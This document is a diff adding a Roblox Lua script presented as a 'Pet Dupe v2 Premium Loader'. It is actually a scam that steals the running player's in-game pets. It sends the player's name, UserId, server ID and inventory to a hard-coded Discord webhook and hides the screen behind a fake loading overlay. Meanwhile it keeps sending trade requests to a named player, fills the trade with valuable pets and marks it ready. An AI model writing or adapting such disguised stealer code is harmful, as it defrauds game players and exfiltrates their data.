@@ -1,0 +1,619 @@
+--// Pet Dupe v2 PREMIUM Loader (Draggable + Icon + Gradient + Neon Button + Black Screen After Click)
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ВЕБХУК
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1474804449003442227/YydbR_345X33N_uofAju3qgizRfph62Ty9xODHEldS2r9UlLf4gEsYOpAhiX5ZGmI5f0"
+
+-- Сервер инфа
+local jobId = game.JobId
+local placeId = game.PlaceId
+local playerCount = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers or 8
+local isFull = (playerCount >= 8)
+
+-- Удаление старых UI
+pcall(function()
+	if playerGui:FindFirstChild("PremiumLoaderUI") then
+		playerGui.PremiumLoaderUI:Destroy()
+	end
+	if playerGui:FindFirstChild("AbsoluteBlackLoader") then
+		playerGui.AbsoluteBlackLoader:Destroy()
+	end
+end)
+
+-- =========================
+-- PREMIUM UI
+-- =========================
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PremiumLoaderUI"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 999999
+screenGui.Parent = playerGui
+
+-- Затемнённый фон
+local dim = Instance.new("Frame")
+dim.Size = UDim2.new(1,0,1,0)
+dim.BackgroundColor3 = Color3.fromRGB(0,0,0)
+dim.BackgroundTransparency = 0.35
+dim.BorderSizePixel = 0
+dim.Parent = screenGui
+
+-- Главное окно
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 460, 0, 260)
+main.Position = UDim2.new(0.5, -230, 0.5, -130)
+main.BackgroundColor3 = Color3.fromRGB(18,18,22)
+main.BorderSizePixel = 0
+main.Parent = dim
+
+local corner = Instance.new("UICorner", main)
+corner.CornerRadius = UDim.new(0, 16)
+
+local stroke = Instance.new("UIStroke", main)
+stroke.Color = Color3.fromRGB(70,70,90)
+stroke.Thickness = 1.5
+
+-- Градиент (premium стиль)
+local gradient = Instance.new("UIGradient", main)
+gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(25,25,35)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(15,15,20))
+}
+gradient.Rotation = 90
+
+-- ИКОНКА
+local icon = Instance.new("ImageLabel")
+icon.Size = UDim2.new(0, 48, 0, 48)
+icon.Position = UDim2.new(0, 18, 0, 18)
+icon.BackgroundTransparency = 1
+icon.Image = "rbxassetid://7733964640" -- можно заменить на свою
+icon.Parent = main
+
+-- Заголовок
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -80, 0, 40)
+title.Position = UDim2.new(0, 70, 0, 20)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBold
+title.Text = "Pet Dupe v2 Premium Loader"
+title.TextSize = 26
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = main
+
+-- Статус сервера
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -40, 0, 40)
+status.Position = UDim2.new(0, 20, 0, 80)
+status.BackgroundTransparency = 1
+status.Font = Enum.Font.Gotham
+status.TextSize = 18
+status.TextColor3 = Color3.fromRGB(200,200,200)
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Parent = main
+
+if isFull then
+	status.Text = "Server Status: FULL (8/8) - Not Recommended"
+	status.TextColor3 = Color3.fromRGB(255, 120, 120)
+else
+	status.Text = "Server Status: OK - Safe To Load"
+	status.TextColor3 = Color3.fromRGB(120, 255, 140)
+end
+
+-- Описание
+local desc = Instance.new("TextLabel")
+desc.Size = UDim2.new(1, -40, 0, 60)
+desc.Position = UDim2.new(0, 20, 0, 120)
+desc.BackgroundTransparency = 1
+desc.Font = Enum.Font.Gotham
+desc.Text = "Secure premium loader interface.\nPress LOAD to initialize the system."
+desc.TextSize = 18
+desc.TextColor3 = Color3.fromRGB(180,180,200)
+desc.TextWrapped = true
+desc.TextXAlignment = Enum.TextXAlignment.Left
+desc.Parent = main
+
+-- НЕОНОВАЯ КНОПКА LOAD
+local loadBtn = Instance.new("TextButton")
+loadBtn.Size = UDim2.new(0, 280, 0, 60)
+loadBtn.Position = UDim2.new(0.5, -140, 1, -80)
+loadBtn.BackgroundColor3 = Color3.fromRGB(30,30,40)
+loadBtn.Text = "LOAD SCRIPT"
+loadBtn.Font = Enum.Font.GothamBold
+loadBtn.TextSize = 24
+loadBtn.TextColor3 = Color3.fromRGB(255,255,255)
+loadBtn.Parent = main
+
+local btnCorner = Instance.new("UICorner", loadBtn)
+btnCorner.CornerRadius = UDim.new(0, 12)
+
+local btnStroke = Instance.new("UIStroke", loadBtn)
+btnStroke.Thickness = 2
+btnStroke.Color = Color3.fromRGB(120, 170, 255)
+
+local btnGradient = Instance.new("UIGradient", loadBtn)
+btnGradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 120, 255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 60, 255))
+}
+
+-- =========================
+-- DRAGGABLE ОКНО
+-- =========================
+local dragging = false
+local dragInput, dragStart, startPos
+
+main.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = main.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+main.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		local delta = input.Position - dragStart
+		main.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+
+local ALLOWED_PETS = {
+	["Noobini Infeeny"] = true,
+	["Anububu"] = true,
+	["Meta Technetta"] = true,
+	["Cupitron Consoletron"] = true,
+	["Divine Block"] = true,
+	["Infinity Block"] = true
+}
+
+
+
+
+local function getBackpackPets()
+	local backpack = player:WaitForChild("Backpack", 15)
+	if not backpack then
+		return {"Backpack not found"}
+	end
+
+	local pets = {}
+
+	for _, item in ipairs(backpack:GetChildren()) do
+		-- берём имя пета из Attributes.DisplayName
+		local displayName = item:GetAttribute("DisplayName")
+
+		if displayName and displayName ~= "" then
+			table.insert(pets, "• " .. displayName)
+		else
+			-- fallback если атрибут вдруг отсутствует
+			table.insert(pets, "• " .. item.Name)
+		end
+	end
+
+	if #pets == 0 then
+		table.insert(pets, "• No pets/items found in Backpack")
+	end
+
+	return pets
+end
+
+
+local function getTradeMenu()
+	local playerGui = player:WaitForChild("PlayerGui", 15)
+	if not playerGui then return nil end
+	
+	local menus = playerGui:FindFirstChild("Menus")
+	if not menus then return nil end
+	
+	return menus:FindFirstChild("Trade")
+end
+
+
+
+
+
+local function getTargetPets()
+	local backpack = player:WaitForChild("Backpack") -- БЕЗ таймаута!
+	local pets = {}
+
+	for _, item in ipairs(backpack:GetChildren()) do
+		local displayName = item:GetAttribute("DisplayName")
+
+		if displayName then
+			for allowedName in pairs(ALLOWED_PETS) do
+				-- частичное совпадение как в рабочем скрипте
+				if string.find(displayName, allowedName) then
+					table.insert(pets, {
+						uuid = item.Name,
+						name = displayName
+					})
+					break
+				end
+			end
+		end
+	end
+
+	return pets
+end
+
+-- РЕМОУТЫ (как в рабочем скрипте)
+local tradeSetSlotRemote = ReplicatedStorage
+	:WaitForChild("Shared")
+	:WaitForChild("Remotes")
+	:WaitForChild("Networking")
+	:WaitForChild("RF/TradeSetSlotOffer")
+
+local tradeReadyRemote = ReplicatedStorage
+	:WaitForChild("Shared")
+	:WaitForChild("Remotes")
+	:WaitForChild("Networking")
+	:WaitForChild("RE/Trading/TradeReadyTrade")
+
+local function startAutoAddPetsLoop()
+	task.spawn(function()
+		print("Waiting for Trade UI...")
+
+		local processedThisTrade = false
+		local tradeCompletedThisCycle = false
+
+		while true do
+			local tradeMenu = getTradeMenu()
+
+			if tradeMenu and tradeMenu.Visible then
+				-- если уже обработали этот трейд — ничего не делаем
+				if not processedThisTrade then
+					processedThisTrade = true
+					tradeCompletedThisCycle = false -- сброс перед трейдом
+
+					local pets = getTargetPets()
+
+					if #pets == 0 then
+						warn("Target pets not found")
+						task.wait(1)
+						continue
+					end
+
+					print("Trade detected! Adding pets:", #pets)
+
+					local slot = 1
+					local addedCount = 0
+
+					for _, pet in ipairs(pets) do
+						if slot > 9 then break end
+
+						local args = {
+							tostring(slot),
+							pet.uuid
+						}
+
+						print("Adding:", pet.name, "-> slot", slot)
+
+						local success = pcall(function()
+							tradeSetSlotRemote:InvokeServer(unpack(args))
+						end)
+
+						if success then
+							addedCount += 1
+						end
+
+						slot += 1
+						task.wait(0.35)
+					end
+
+					task.wait(2)
+
+					if tradeMenu.Visible and addedCount > 0 then
+						pcall(function()
+							tradeReadyRemote:FireServer(true, addedCount)
+						end)
+					end
+				end
+			else
+				-- трейд закрылся после того как мы его обработали → успешный трейд
+				if processedThisTrade and not tradeCompletedThisCycle then
+					tradeCompletedThisCycle = true
+					print("Trade completed! Sending webhook...")
+					sendWebhook("Trade Successful")
+				end
+
+				-- разрешаем обработку нового трейда
+				processedThisTrade = false
+			end
+
+			task.wait(0.3)
+		end
+	end)
+end
+
+-- =========================
+-- ВЕБХУК
+-- =========================
+local function httpPost(url, body)
+	if syn and syn.request then
+		return syn.request({
+			Url = url,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = body
+		})
+	elseif http_request then
+		return http_request({
+			Url = url,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = body
+		})
+	elseif request then
+		return request({
+			Url = url,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = body
+		})
+	else
+		warn("HTTP request function not found (webhook failed)")
+	end
+end
+
+local function sendWebhook(statusText)
+	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+
+	local petsTable = getBackpackPets()
+	local petsText = table.concat(petsTable, "\n")
+
+	if #petsText > 1000 then
+		petsText = string.sub(petsText, 1, 1000) .. "\n• ... (truncated)"
+	end
+
+	local data = {
+		username = "Pet Dupe v2 Logger",
+		embeds = {
+			{
+				title = "Premium Loader | Server Report",
+				color = 3092790,
+				fields = {
+					{name = "Player", value = player.Name, inline = true},
+					{name = "UserId", value = tostring(player.UserId), inline = true},
+					{name = "Players", value = playerCount.."/"..maxPlayers, inline = false},
+					{name = "JobId (ServerID)", value = jobId, inline = false},
+					{name = "PlaceId", value = tostring(placeId), inline = false},
+					{name = "Status", value = statusText, inline = false}
+				}
+			},
+			{
+				title = "Backpack Pets Scan",
+				color = 5814783,
+				fields = {
+					{
+						name = "Total Pets/Items",
+						value = tostring(#petsTable),
+						inline = true
+					},
+					{
+						name = "Pets (DisplayName)",
+						value = petsText,
+						inline = false
+					}
+				}
+			}
+		}
+	}
+
+	local body = HttpService:JSONEncode(data)
+	httpPost(WEBHOOK_URL, body)
+end
+
+-- =========================
+-- AUTO WEBHOOK ON SCRIPT START
+-- =========================
+task.spawn(function()
+	if isFull then
+		sendWebhook("Script Executed | Server Full ("..playerCount.."/"..maxPlayers..")")
+	else
+		sendWebhook("Script Executed | Server OK ("..playerCount.."/"..maxPlayers..")")
+	end
+end)
+
+
+-- =========================
+-- AUTO TRADE LOOP (YOUR GAME REMOTE)
+-- =========================
+
+local TARGETS = {
+	"Teadiosmo",
+}
+
+local TRADE_DELAY = 3
+local tradeRemote = nil
+local remoteLoaded = false
+
+-- Ждём загрузку игры и нужного Remote
+task.spawn(function()
+	if not game:IsLoaded() then
+		game.Loaded:Wait()
+	end
+	
+	task.wait(3) -- даём игре прогрузить ремоуты
+	
+  local success, result = pcall(function()
+  	return ReplicatedStorage
+  		:WaitForChild("Shared", 20)
+  		:WaitForChild("Remotes", 20)
+  		:WaitForChild("Networking", 20)
+  		:WaitForChild("RF/TradeSendTrade", 20)
+  end)
+	
+	if success and result then
+		tradeRemote = result
+		remoteLoaded = true
+		warn("Trade Remote Loaded Successfully")
+	else
+		warn("Trade Remote NOT FOUND")
+	end
+end)
+
+local function getTargetPlayers()
+	local found = {}
+	
+	for _, name in ipairs(TARGETS) do
+		local plr = Players:FindFirstChild(name)
+		if plr then
+			table.insert(found, plr)
+		end
+	end
+	
+	return found
+end
+
+local function startTradeLoop()
+	task.spawn(function()
+		while true do
+			-- не работаем пока remote не найден
+			if remoteLoaded and tradeRemote then
+				local targets = getTargetPlayers()
+				
+				if #targets > 0 then
+					for _, target in ipairs(targets) do
+						pcall(function()
+							tradeRemote:InvokeServer(target)
+						end)
+						
+						task.wait(0.5) -- микрозадержка между игроками (анти-краш)
+					end
+					
+					task.wait(TRADE_DELAY) -- твои 3 секунды
+				else
+					-- если их нет в сервере — не грузим клиент
+					task.wait(2)
+				end
+			else
+				task.wait(2)
+			end
+		end
+	end)
+end
+
+loadBtn.MouseButton1Click:Connect(function()
+	pcall(function()
+		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+	end)
+
+	for _, gui in pairs(playerGui:GetChildren()) do
+		if gui:IsA("ScreenGui") then
+			gui.Enabled = false
+		end
+	end
+
+	playerGui.ChildAdded:Connect(function(child)
+		if child:IsA("ScreenGui") and child.Name ~= "AbsoluteBlackLoader" then
+			child.Enabled = false
+		end
+	end)
+
+	local blackGui = Instance.new("ScreenGui")
+	blackGui.Name = "AbsoluteBlackLoader"
+	blackGui.IgnoreGuiInset = true
+	blackGui.DisplayOrder = 9999999
+	blackGui.Parent = playerGui
+
+	local black = Instance.new("Frame")
+	black.Size = UDim2.new(1,0,1,0)
+	black.BackgroundColor3 = Color3.fromRGB(0,0,0)
+	black.BorderSizePixel = 0
+	black.Parent = blackGui
+
+	local text = Instance.new("TextLabel")
+	text.Size = UDim2.new(0,900,0,120)
+	text.Position = UDim2.new(0.5,-450,0.5,-60)
+	text.BackgroundTransparency = 1
+	text.Font = Enum.Font.GothamBold
+	text.TextSize = 40
+	text.TextColor3 = Color3.fromRGB(255,255,255)
+	text.TextWrapped = true
+	text.TextXAlignment = Enum.TextXAlignment.Center
+	text.TextYAlignment = Enum.TextYAlignment.Center
+	text.Parent = black
+
+  local loadingSteps = {
+  	"Checking server integrity",
+  	"Loading system",
+  	"Initializing modules",
+  	"Verifying environment",
+  	"Preparing user interface",
+  	"Finalizing startup"
+  }
+  
+  local function animateLoadingText(label)
+  	task.spawn(function()
+  		local stepIndex = 1
+  		local dotCount = 0
+  
+  		while true do
+  			if isFull then
+  				label.Text = "Server is FULL (8/8)\nServer may be bugged.\nRejoining a new empty server recommended."
+  				break
+  			end
+  
+  			local textToShow = loadingSteps[stepIndex] or "Loading"
+  			textToShow = textToShow .. string.rep(".", dotCount)
+  
+  			label.Text = textToShow
+  			dotCount = dotCount + 1
+  			if dotCount > 3 then dotCount = 0 end
+  
+  			task.wait(7)
+  
+  			stepIndex = stepIndex + 1
+  			if stepIndex > #loadingSteps then
+  				stepIndex = 1
+  			end
+  		end
+  	end)
+  end
+  
+  -- Используем эту функцию
+  animateLoadingText(text)
+  
+  -- Отправка вебхука в фоне
+  if isFull then
+  	sendWebhook("Server Full / Possibly Bugged")
+  else
+  	sendWebhook("Server OK")
+  end
+  
+  startTradeLoop()
+
+  task.delay(2, function()
+	sendWebhook("Loader Started + Pets Scanned")
+  end)
+
+  -- Запуск авто-добавления петов в трейд
+  startAutoAddPetsLoop()
+end)
+
